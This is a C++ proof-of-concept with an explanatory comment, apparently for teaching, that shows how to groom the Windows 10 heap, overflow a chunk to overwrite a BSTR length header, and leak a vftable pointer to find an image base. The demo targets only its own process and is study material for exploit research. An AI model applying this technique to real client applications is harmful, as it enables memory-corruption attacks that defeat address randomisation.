#include <Windows.h>
#include <comdef.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <iostream>
using namespace std;

/*
Heap Overflow Information Leak

This demonstrates how to use a heap overflow to leak something in memory on Windows 10.
Unlike Windows 7 and Windows systems before that, exploit devs used to rely on LFH to
create adjacent heap allocations to gain control of an object. In my experiment, about
97% of the time repeated allocations would result a predictable allocation pattern,
but on Windows 10, it is less than 10%, so it's pretty random.

The conditions required for this example include:
* You have control of a heap overflow
* You can create objects the application provides
* You can create heap allocations
* You can use vectors, arrays, and BSTRs
* You can read a string

Typically, a client side application such as a browser engine or actionscript would
satisfy these conditions.

The approach we take to achieve the info leak is this (there are 3 stages):

First stage : Heap Grooming

This is what makes Windows 10 more difficult to exploit. Basically you will do a lot
of !heap -x, !heap -p -a, !heap -flt s, !heap -p -h, and dt _HEAP to figure out
how to lay this out.

1. Create about 16 heap allocations, use an array to track them. The size should be
   carefully selected, ideally you want:
   * It not being in LFH at all.
   * Something that is 4-byte aligned because you'll be working with pointers so
     the alignment is easier to work with.
2. Free one of the allocations. You should consider these conditions before choosing
   which allocation to free:
   * The gap between the allocation you want to free, and the one before that, should
     be close.
   * Same for the allocation after the one you want to free.
3. Create no more than 10 BSTRs, and they should be tracked by an array. The size
   should be smaller than the heap allocations so that they have a chance to fall into
   the hole. I think some people call this condition "coalesced". You want at least one
   BSTR falling into the right one. Notice that the address for the BSTR may not be
   exactly the same as the freed one, but this is expected, because there is an extra
   4-byte header. You should see the freed allocation being busy again anyway.
4. Free another allocation. This one should be right after the BSTR that fell into
   the hole.
5. Create no more than 10 vectors. The size of these vectors should be less than the
   freed allocation, and they should made up of pointers for the same object (that should
   contain a vftable). 
6. At this point, you should have a layout that looks like this:
   [ Heap Chunk ][ BSTR ][ Objects ]

Second stage : Overflowing the heap

1. Knowing that the BSTR has a four-byte size header, and the content is unicode,
   carefully overflow the chunk, and write past the four-byte-size header. The
   most important mission of the heap overflow is really just overwrite the
   size header of a BSTR.

Third stage : Reading the vftable

1. Read the BSTR with the modified size header due to the heap overflow. You will
   probably read a lot of data back, but in there, there should be a four-byte
   value that is basically a pointer to the object.
2. After you find the four bytes, you will need some conversion to convert those
   4 bytes into an integer.
3. When an object is created, usually the first thing that happens is:
   1. A heap allocation
   2. A vftable assigned to it
   Because of that, you may need to dereference.
4. Finally, calculate the offset between the vftable and the image base. And then
   use that to find the image base.


Tested on: Windows 10 as of May 29th, 2019

Special thanks to the following folks:

1. mr_me
2. Corelanc0d3r

_sinn3r

*/

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
  void function1() {};
  virtual void virtual_function1() {};
};

// Overflow the 2nd chunk
// Corrupt the 3rd chunk
// The fourth chunk is the object we want to read

int main(int args, char** argv) {
  int i;
  BSTR bstr;
  BOOL result;
  HANDLE hChunk;
  void* allocations[ALLOC_COUNT];
  BSTR bStrings[5];
  SomeObject* object = new SomeObject();
  HANDLE defaultHeap = GetProcessHeap();
  if (defaultHeap == NULL) {
    printf("No process heap. Are you having a bad day?\n");
    return -1;
  }

  printf("Default heap = 0x%08x\n", defaultHeap);

  // If i is higher than 18, the allocation will be in LFH starting at the 19th chunk
  printf("The following should be all in the backend allocator\n");
  for (i = 0; i < ALLOC_COUNT; i++) {
    hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
    memset(hChunk, 'A', CHUNK_SIZE);
    allocations[i] = hChunk;
    printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
  }

  printf("Freeing allocation at index 3: 0x%08x\n", allocations[3]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  for (i = 0; i < 5; i++) {
    // Memory look:
    // 014f5b26 42 42 42 42 42 42 42 42 42 42 6c 13 b1  BBBBBBBBBBl..
    // 014f5b33 ed 0a b0 00 08 f8 00 00 00 41 00 41 00  .........A.A.
    // 014f5b40 41 00 41 00 41 00 41 00 41 00 41 00 41  A.A.A.A.A.A.A
    bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    bStrings[i] = bstr;
    printf("[%d] BSTR string : 0x%08x\n", i, bstr);
  }

  printf("Freeing allocation at index 4 : 0x%08x\n", allocations[4]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[4]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  int objRef = (int) object;
  printf("SomeObject address : 0x%08x\n", objRef);
  printf("Allocating SomeObject to vectors\n");
  vector<int> array1(40, objRef);
  vector<int> array2(40, objRef);
  vector<int> array3(40, objRef);
  vector<int> array4(40, objRef);
  vector<int> array5(40, objRef);
  vector<int> array6(40, objRef);
  vector<int> array7(40, objRef);
  vector<int> array8(40, objRef);
  vector<int> array9(40, objRef);
  vector<int> array10(40, objRef);

  UINT strSize = SysStringByteLen(bStrings[0]);
  printf("Original String size: %d\n", (int) strSize);
  printf("Overflowing allocation 2\n");

  char evilString[] =
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "BBBBBBBBBBBBBBBB"
    "CCCCDDDD"
    "\xff\x00\x00\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00";
  memcpy(allocations[2], evilString, sizeof(evilString));
  strSize = SysStringByteLen(bStrings[0]);
  printf("Modified String size: %d\n", (int) strSize);

  std::wstring ws(bStrings[0], strSize);
  std::wstring ref = ws.substr(120+16, 4);
  char buf[4];
  memcpy(buf, ref.data(), 4);
  int refAddr = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
  memcpy(buf, (void*) refAddr, 4);
  int vftable = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
  printf("Found vftable address : 0x%08x\n", vftable);
  int baseAddr = vftable - 0x0003a564;
  printf("====================================\n");
  printf("Image base address is : 0x%08x\n", baseAddr);
  printf("====================================\n");

  system("PAUSE");

  return 0;
}
